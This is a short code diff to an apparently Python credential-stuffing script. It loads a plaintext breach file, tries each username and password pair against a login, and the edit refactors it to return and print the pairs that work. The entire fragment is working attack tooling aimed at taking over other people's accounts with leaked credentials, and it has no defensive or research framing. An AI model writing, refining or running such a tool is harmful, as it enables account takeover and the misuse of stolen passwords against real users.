@@ -31,11 +31,12 @@ def credential_stuffing_attack(creds):
         login_succ = attempt_login(uname, pswd)
         if login_succ:
             success_creds.append(cred_pair)
-            print(cred_pair)
+    return success_creds
 
 def main():
     creds = load_breach(PLAINTEXT_BREACH_PATH)
-    credential_stuffing_attack(creds)
+    creds = credential_stuffing_attack(creds)
+    print(creds)
 
 if __name__ == "__main__":
     main()
